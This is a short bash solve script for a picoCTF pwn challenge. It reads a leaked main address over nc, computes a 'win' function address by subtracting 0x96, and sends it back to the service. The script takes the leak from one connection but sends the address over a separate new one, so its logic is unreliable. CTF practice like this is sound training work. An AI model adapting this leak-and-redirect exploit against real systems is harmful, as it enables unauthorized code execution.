#!/bin/bash

HOST="rescued-float.picoctf.net"
PORT=55368

echo "[+] Connecting to challenge..."

# capture server output
response=$(nc $HOST $PORT)

# extract leaked address
leak=$(echo "$response" | grep -o '0x[0-9a-fA-F]*')

echo "[+] Leaked main address: $leak"

# calculate win address (main - 0x96)
win=$(printf "0x%lx" $((leak - 0x96)))

echo "[+] Calculated win address: $win"

echo "[+] Sending exploit..."

# send calculated address
(
echo "$win"
sleep 1
) | nc $HOST $PORT
